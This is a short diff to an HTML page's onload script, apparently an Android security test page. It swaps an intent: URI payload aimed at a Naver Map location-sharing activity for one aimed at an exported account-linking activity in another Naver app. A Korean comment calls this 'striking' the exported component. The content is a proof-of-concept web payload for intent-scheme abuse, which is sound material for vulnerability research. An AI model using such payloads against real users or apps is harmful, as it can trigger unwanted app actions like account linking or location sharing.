@@ -6,16 +6,8 @@
     
     <script>
     window.onload = function() {
-        // 1. Action(android.intent.action.VIEW) 추가
-        // 2. Category(android.intent.category.BROWSABLE) 추가 (부모 클래스 g의 특성 반영)
-        var payload = "intent:#Intent;" +
-                      "action=android.intent.action.VIEW;" +
-                      "category=android.intent.category.BROWSABLE;" +
-                      "package=com.nhn.android.nmap;" +
-                      "component=com.nhn.android.nmap/com.naver.map.feature.sharelocation.ShareLocationMainActivity;" +
-                      "end";
-        
-        location.href = payload;
+        // exported="true"인 컴포넌트 타격
+        location.href = "intent:#Intent;package=com.naver.nozzle;component=com.naver.nozzle/com.naver.nozzle.skillstore.SkillStoreAccountLinkingActivity;end";
     };
 </script>
 </body>
